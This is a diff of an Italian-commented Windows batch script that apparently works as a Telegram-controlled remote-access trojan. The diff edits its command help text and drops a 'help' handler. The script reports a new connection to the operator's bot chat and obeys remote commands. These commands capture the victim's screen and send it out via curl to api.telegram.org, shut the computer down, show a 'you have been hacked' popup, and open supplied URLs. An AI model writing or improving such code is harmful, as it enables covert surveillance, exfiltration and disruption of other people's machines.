@@ -15,7 +15,7 @@ set "SCREENSHOT_PATH=%TEMP%\%RANDOM%.png"
 set "URL_FILE=%TEMP%\last_url.txt"
 set "LAST_UPDATE_ID=0"
 
-:: Invia notifica di connessione + help (solo al primo avvio)
+:: Invia notifica di connessione e help (solo al primo avvio)
 if not exist "%TEMP%\connected.txt" (
     curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
         -d "chat_id=%CHAT_ID%" ^
@@ -24,13 +24,10 @@ if not exist "%TEMP%\connected.txt" (
     curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
         -d "chat_id=%CHAT_ID%" ^
         -d "text=📜 COMANDI DISPONIBILI:
-• foto - Cattura screenshot
-• chiudi - Spegne il computer
-• pop - Mostra avviso 'Sei stato hackerato'
-• https://... - Apri URL e invia screenshot
-        
-⚠️ Tutti i comandi sono eseguiti una sola volta" ^
-        -d "parse_mode=Markdown"
+• 'foto' - Invio screenshot schermo
+• 'pop' - Mostra popup avviso
+• 'chiudi' - Spegne il computer
+• 'https://...' - Apri URL e invia screenshot"
     
     echo 1 > "%TEMP%\connected.txt"
 )
@@ -80,19 +77,6 @@ for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\update
         curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
             -d "chat_id=%CHAT_ID%" ^
             -d "text=💣 Popup mostrato su %COMPUTERNAME%"
-    )
-    
-    if /i "!command!" == "help" (
-        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
-            -d "chat_id=%CHAT_ID%" ^
-            -d "text=📜 COMANDI DISPONIBILI:
-• foto - Cattura screenshot
-• chiudi - Spegne il computer
-• pop - Mostra avviso 'Sei stato hackerato'
-• https://... - Apri URL e invia screenshot
-            
-⚠️ Tutti i comandi sono eseguiti una sola volta" ^
-            -d "parse_mode=Markdown"
     )
     
     echo !command! | findstr /r /c:"^http://" /c:"^https://" >nul && (
